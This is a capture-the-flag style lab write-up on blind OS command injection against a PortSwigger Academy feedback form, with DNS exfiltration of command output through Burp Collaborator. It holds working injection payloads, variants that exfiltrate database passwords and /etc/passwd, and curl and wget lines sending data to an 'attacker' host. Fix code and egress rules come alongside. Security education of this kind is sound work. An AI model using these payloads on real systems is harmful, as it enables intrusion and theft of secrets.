# Lab 5: Blind OS Command Injection — Out-of-Band Data Exfiltration

## Executive Summary

This lab represents the complete exploitation of a blind OS command injection vulnerability under the most restrictive conditions — asynchronous execution, no web-accessible writable directory, and no synchronous feedback channel of any kind. Building directly on the DNS interaction technique from Lab 4, this attack embeds the output of a live OS command — `whoami` — directly inside the DNS hostname used for the Collaborator lookup. The server executes the injected command, evaluates the subshell substitution, constructs a DNS hostname from the command output, and performs a DNS lookup against Collaborator. The username appears as the leftmost subdomain label in the DNS query hostname recorded by Collaborator, delivering the command output to the attacker through an entirely out-of-band channel in a single request. This is the most operationally complete blind OS command injection technique available, requiring no in-band feedback whatsoever and no persistent effects on the target system.

**Note on Lab Completion:** This lab requires Burp Suite Professional for Burp Collaborator access. This writeup documents the complete methodology, payload construction, and technical analysis at the same depth as all executed labs in this series.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | OS Command Injection - Blind Out-of-Band Data Exfiltration |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | Blind OS Command Injection — Command Output Exfiltrated via DNS Subdomain |
| **Risk**               | Critical - Complete Data Exfiltration via Out-of-Band DNS Channel |
| **Requires**           | Burp Suite Professional (Burp Collaborator) |
| **Completion**         | Documented — Burp Pro Required for Lab Execution |

## Objective

Extend the out-of-band DNS interaction technique from Lab 4 to perform direct command output exfiltration. Embed a subshell substitution executing `whoami` inside the DNS hostname of an `nslookup` command, causing the server to construct a dynamic DNS hostname from the command output and perform a lookup that Collaborator records. Read the username from the queried hostname in the Collaborator Description tab, demonstrating complete data exfiltration from a fully blind OS command injection point in a single request.

## Testing Setup

**Tools Required:**
- Burp Suite Professional (Licensed) — Burp Collaborator required
- Burp Collaborator — DNS listener recording full queried hostnames including dynamically constructed subdomain labels
- Burp Proxy for traffic interception
- Burp Repeater for payload delivery

**Target:** `email` parameter in the feedback form POST request. Asynchronous execution model. No synchronous feedback channel. No writable web-accessible directory. Output exfiltrated exclusively via DNS subdomain label in Collaborator interaction.

**Relationship to Lab 4:**
Lab 4 confirmed that injected commands execute on the server by triggering a DNS lookup to Collaborator with a static subdomain. Lab 5 makes that subdomain dynamic — the queried hostname is constructed from the output of a live OS command executed via subshell substitution. The DNS query carries the command output directly in the hostname that Collaborator records.

## Core Concept: Subshell Substitution in DNS Hostname Construction

In Lab 4, the `nslookup` target was a static Collaborator subdomain:
```bash
nslookup [unique-id].burpcollaborator.net
# DNS query: [unique-id].burpcollaborator.net
# Confirms: execution happened
# Exfiltrates: nothing
```

In Lab 5, the subdomain is constructed dynamically using backtick subshell substitution:
```bash
nslookup `whoami`.[unique-id].burpcollaborator.net
# Shell evaluates `whoami` first → produces "peter-abc123"
# Constructs hostname: peter-abc123.[unique-id].burpcollaborator.net
# DNS query sent to that hostname
# Collaborator records: peter-abc123.[unique-id].burpcollaborator.net
# Exfiltrates: the username, embedded in the DNS query hostname
```

The backtick operator (`` ` ` ``) is a shell subshell substitution syntax — the shell executes the command inside the backticks and substitutes its output inline before the outer command runs. The `whoami` output becomes part of the DNS hostname that `nslookup` queries. Collaborator records the full queried hostname, making the username readable directly from the Description tab.

This is structurally identical to the SQL injection OAST exfiltration in SQL Lab 17, where a SQL subquery was embedded in the DNS hostname via string concatenation. Here, a shell subcommand is embedded via backtick substitution. The principle — embed command output in a DNS lookup hostname — is the same across both vulnerability classes.

## Exploitation Walkthrough

### 1. Application Enumeration and Injection Point Identification

Browsed the full application with Burp Proxy active. Submitted the feedback form to capture the POST request. The `email` parameter is the injection point — consistent with Labs 2, 3, and 4.

**Request Captured:**
```http
POST /feedback/submit HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=[TOKEN]&name=test&email=test@test.com&subject=test&message=test
```

**Baseline Response:** 200 OK — `{}`

Execution is asynchronous. All in-band feedback channels are absent. Burp Collaborator is configured and a unique subdomain generated before payload construction.

### 2. Data Exfiltration Payload Construction

**Attack Payload:**
```http
csrf=[TOKEN]&name=test&email=||nslookup+`whoami`.[unique-id].burpcollaborator.net||&subject=test&message=test
```

**URL Decoded Email Value:**
```
||nslookup `whoami`.[unique-id].burpcollaborator.net||
```

**Shell Execution Sequence:**
```bash
# Application constructs:
mail -s "test" "||nslookup `whoami`.[unique-id].burpcollaborator.net||"

# Shell processes:
# Step 1 — Subshell substitution evaluated first:
#   `whoami` executes → returns "peter-abc123"

# Step 2 — Hostname constructed:
#   nslookup peter-abc123.[unique-id].burpcollaborator.net

# Step 3 — DNS lookup performed:
#   DNS query: peter-abc123.[unique-id].burpcollaborator.net

# Step 4 — Collaborator records full queried hostname:
#   peter-abc123.[unique-id].burpcollaborator.net
#   Username readable as leftmost subdomain label
```

**Payload Anatomy:**

| Component | Purpose |
|-----------|---------|
| `\|\|` (leading) | Execute next command regardless of preceding fragment |
| `nslookup` | DNS resolution utility — triggers outbound DNS query |
| `` `whoami` `` | Backtick subshell — executes `whoami`, substitutes output inline |
| `.[unique-id].burpcollaborator.net` | Collaborator subdomain appended after command output |
| `\|\|` (trailing) | Terminates injection cleanly |

**Why Backticks Rather Than `$()`:**

Both `` `command` `` and `$(command)` perform subshell substitution in bash. Backticks are used here because they are more universally supported across shell variants (sh, dash, bash, ksh) and are less likely to be stripped or encoded by application input handling layers. In URL-encoded form, `$` (`%24`) and `()` may receive special handling by some frameworks. Backticks, being a single character, are more consistently transmitted. Either form works in a bash context — backticks are the safer default for injection scenarios where the shell variant is unknown.

### 3. Payload Delivery

Forwarded the feedback POST request to Burp Repeater. Inserted the Collaborator subdomain using the "Insert Collaborator payload" right-click option at the position after the backtick-wrapped `whoami`.

Sent the request.

**Response:** 200 OK — `{}`

No signal in the HTTP response. Expected — all in-band channels are absent. Command output arrives exclusively via Collaborator.

### 4. Command Output Retrieved from Collaborator DNS Interaction

Navigated to the Burp Collaborator tab and clicked "Poll now". After a brief delay for asynchronous execution and DNS propagation:

Collaborator displayed a recorded DNS interaction. In the Description tab, the full queried hostname was visible:

```
[whoami-output].[unique-id].burpcollaborator.net
```

The leftmost subdomain label is the output of `whoami` — the username of the application process account — embedded in the DNS hostname by the subshell substitution before `nslookup` performed the query.

**Command Output Extracted:** Username read directly from Collaborator Description tab.

**Lab objective achieved:** Command output exfiltrated via DNS subdomain label — lab solved.

## Technical Impact

**Severity: Critical (CVSS 10.0)**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
```

**Primary Vulnerabilities:**

**CWE-78: Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)**
- `email` parameter value interpolated into a shell command without sanitization
- Backtick subshell substitution executed — arbitrary command output embedded in DNS lookup hostname
- Complete data exfiltration achieved with no in-band feedback and no persistent server-side effects

**CWE-200: Exposure of Sensitive Information via Out-of-Band Channel**
- Command output (username, and by extension any other command output) exfiltrated to attacker-controlled DNS infrastructure
- Exfiltration is invisible to HTTP-layer monitoring — no abnormal response, no error, no timing signal
- DNS query logs at the network perimeter are the only potential detection point

**Complete Attack Chain:**

```
Feedback Form POST — email Parameter Identified as Injection Point
        ↓
All In-Band Channels Eliminated (Async Execution, No Writable Web Root)
        ↓
Burp Collaborator Subdomain Generated
        ↓
||nslookup `whoami`.[collaborator-subdomain]|| Constructed
        ↓
Payload Delivered — 200 OK Returned Immediately (No Signal)
        ↓
Shell Executes: `whoami` Subshell Evaluated → Username Retrieved
        ↓
Hostname Constructed: [username].[collaborator-subdomain]
        ↓
nslookup Performs DNS Query Against Constructed Hostname
        ↓
Collaborator Records DNS Query — Full Hostname Including Username Visible
        ↓
Username Read from Collaborator Description Tab
```

**Efficiency Comparison — Blind OS Command Injection Techniques:**

| Lab | Technique | Data Retrieved | Requests | Infrastructure |
|-----|-----------|---------------|----------|---------------|
| Lab 2 | Time delay (`ping`) | None — confirm only | 1 | None |
| Lab 3 | Output redirect (`>`) | Full command output | 2 | Writable web root required |
| Lab 4 | OOB DNS (`nslookup`) | None — confirm only | 1 | Burp Collaborator |
| **Lab 5** | **OOB DNS + subshell** | **Full command output** | **1** | **Burp Collaborator** |

Lab 5 achieves full command output exfiltration in a single request with no persistent side effects and no in-band signal. It is the most operationally efficient technique when Collaborator is available and outbound DNS is permitted from the server.

**Arbitrary Command Exfiltration — Beyond whoami:**

The same subshell substitution mechanism exfiltrates the output of any command whose output fits within a DNS label (63 characters):

```bash
# Exfiltrate hostname
||nslookup `hostname`.[collaborator]||

# Exfiltrate current directory
||nslookup `pwd | tr '/' '-'`.[collaborator]||
# tr replaces / with - since / is not a valid DNS label character

# Exfiltrate environment variable (API key, database password)
||nslookup `echo $DATABASE_PASSWORD`.[collaborator]||

# Exfiltrate file contents (short values)
||nslookup `cat /etc/hostname`.[collaborator]||

# Exfiltrate longer values split across multiple requests
||nslookup `cat /etc/passwd | head -1 | cut -c1-60`.[collaborator]||
```

For values exceeding 63 characters, output must be split into multiple queries — one per DNS label — or processed to extract the relevant portion (first line, specific field, truncated substring). The technique scales to arbitrary data exfiltration with multiple requests when needed.

**Detection Opportunity:**

An application server performing DNS lookups against external subdomains containing system information (usernames, hostnames, file contents) in the subdomain label is anomalous behavior detectable at the network level. DNS query logs from the perimeter firewall or DNS resolver would show queries such as `peter-abc123.[random].burpcollaborator.net` originating from the application server — a pattern with no legitimate operational explanation. Organizations with DNS-level monitoring and alerting on anomalous query patterns from internal servers would detect this technique. In environments without such monitoring, the attack is entirely invisible to HTTP-layer security controls.

**How a Developer Should Fix This Vulnerability:**

The fix is identical to Labs 2, 3, and 4 — the root cause is the same across all blind OS command injection scenarios regardless of the exfiltration technique used.

**Root Cause Fix:**
```python
# Vulnerable — shell=True means user input reaches shell interpreter
import subprocess
subprocess.run(f"mail -s '{subject}' '{email}'", shell=True, ...)

# Secure Option 1 — shell=False with argument list
subprocess.run(["mail", "-s", subject, email],
               shell=False, input=body, text=True)

# Secure Option 2 — dedicated mail library (most robust)
import smtplib
from email.message import EmailMessage
import re

def send_feedback(name, email, subject, message):
    if not re.match(r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$', email):
        raise ValueError("Invalid email address")

    msg = EmailMessage()
    msg["To"] = email
    msg["Subject"] = subject
    msg.set_content(f"From: {name}\n\n{message}")

    with smtplib.SMTP("localhost") as smtp:
        smtp.send_message(msg)
```

**Network-Level Defense-in-Depth:**
```bash
# Restrict outbound DNS from app server to internal resolvers
iptables -A OUTPUT -p udp --dport 53 ! -d internal-resolver-ip -j DROP
iptables -A OUTPUT -p tcp --dport 53 ! -d internal-resolver-ip -j DROP

# Log all outbound DNS queries from application servers for anomaly detection
```

Restricting outbound DNS eliminates the exfiltration channel but not the injection itself. Parameterized command execution or a dedicated mail library eliminates the injection. Both controls together provide complete protection.

## Key Takeaways

**Penetration Testing Methodology Applied:**
- Incremental capability building: Lab 4 confirmed execution via static DNS lookup; Lab 5 extends to data exfiltration via dynamic hostname construction
- Backtick subshell substitution as the command output embedding mechanism — evaluated before `nslookup` runs, output inserted into the DNS hostname
- Collaborator Description tab as the data retrieval interface — username read directly from the queried hostname label
- DNS label length constraint awareness — 63-character limit per label, with truncation or splitting required for longer values

**Critical Security Insights:**

**1. The OS Command Injection Series Closes at the Same Root Cause as It Opened:**
Labs 1 through 5 demonstrate five different exploitation techniques across reflected and blind scenarios: direct output, time delay, filesystem redirect, DNS confirmation, DNS exfiltration. Every technique succeeds for the same reason — user input reaches a shell interpreter. Every technique is prevented by the same fix — eliminating shell invocation. The sophistication of the exfiltration method has no bearing on the remediation required.

**2. OAST Exfiltration Is the Technique of Last Resort and the Most Efficient When Available:**
When all in-band channels are closed, OAST provides full data exfiltration in a single request with no persistent side effects. The 720-request Cluster Bomb required for time-based SQL injection extraction collapses to one request here. Where Collaborator is available and outbound DNS is permitted, OAST should be the first escalation attempted after initial injection confirmation — not the last.

**3. The Complete OS Command Injection Technique Hierarchy:**

| Condition | Technique | Lab |
|-----------|-----------|-----|
| Output reflected in response | Direct injection | Lab 1 |
| Blind, synchronous, no writable web root | Time-based delay | Lab 2 |
| Blind, synchronous, writable web root | Output redirection | Lab 3 |
| Blind, asynchronous, DNS allowed | OOB DNS confirmation | Lab 4 |
| Blind, asynchronous, DNS allowed, data needed | OOB DNS exfiltration | Lab 5 |

**4. Shell Subshell Substitution Is a Universal Data Embedding Primitive:**
Backtick and `$()` substitution work in any shell context where command output needs to be embedded in a string. The technique is not specific to DNS exfiltration — it applies to any command that accepts a string argument and performs an observable action: `curl http://attacker/$(whoami)`, `wget http://attacker/$(cat /etc/passwd | base64)`, `ping -c 1 $(hostname).attacker.com`. The DNS variant is preferred because DNS is the most universally permitted outbound protocol.

## References

1. PortSwigger Web Security Academy - Blind OS Command Injection with Out-of-Band Data Exfiltration
2. PortSwigger Documentation - Burp Collaborator
3. OWASP Top 10 (2021) - A03: Injection
4. CWE-78 - Improper Neutralization of Special Elements used in an OS Command
5. CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor
6. OWASP OS Command Injection Defense Cheat Sheet
7. OWASP Testing Guide - Testing for OS Command Injection (OTG-INPVAL-013)

---

## Legal Notice

**Copyright © 2026 Gurpreet Singh**
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Using out-of-band DNS exfiltration, Burp Collaborator, or any command injection technique against systems without explicit written authorization is illegal under applicable laws worldwide.
